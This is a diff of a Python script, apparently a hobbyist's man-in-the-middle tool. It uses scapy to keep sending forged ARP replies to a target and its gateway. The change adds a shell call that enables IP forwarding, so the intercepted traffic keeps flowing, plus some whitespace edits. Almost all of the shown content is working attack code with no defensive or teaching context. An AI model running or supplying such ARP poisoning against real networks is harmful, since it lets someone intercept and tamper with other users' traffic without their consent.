@@ -1,7 +1,9 @@
 import scapy.all as scapy
 import optparse
 import time
+import subprocess as sp
 
+sp.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 
 def get_user_input():
     parse_object = optparse.OptionParser()
@@ -39,6 +41,9 @@ def reset_spoofing(target_ip, gateway_ip):
     scapy.send(arp_response, verbose=False, count=5)
 
 
+
+
+
 packet_count = 0
 
 user_ips = get_user_input()
@@ -49,11 +54,10 @@ try:
     while True:
         arp_spoofing(user_target_ip,user_gateway_ip)
         arp_spoofing(user_gateway_ip,user_target_ip)
-
         packet_count += 2
         print("\rSending packets " + str(packet_count), end="")
-
         time.sleep(3)
+
 
 except PermissionError:
     print("\nYou must be root!")
